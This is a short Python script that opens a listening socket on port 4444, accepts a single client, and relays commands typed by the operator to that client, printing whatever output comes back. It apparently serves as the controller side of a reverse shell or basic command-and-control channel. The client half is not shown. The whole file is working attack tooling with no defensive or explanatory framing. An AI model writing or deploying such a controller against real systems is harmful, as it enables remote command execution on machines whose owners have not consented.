import socket

HOST = '0.0.0.0'
PORT = 4444
print(HOST)
server = socket.socket()
server.bind((HOST, PORT))

print('server has started')
print('listening for client connection')
server.listen(1)

client, client_addr = server.accept()

print(f'{client_addr} Client connected to the server')

while True:
    command = input('enter a command')
    command = command.encode()
    client.send(command)
    print('command sent!')
    output = client.recv(1024)
    output = output.decode()
    print(f'output:{output}')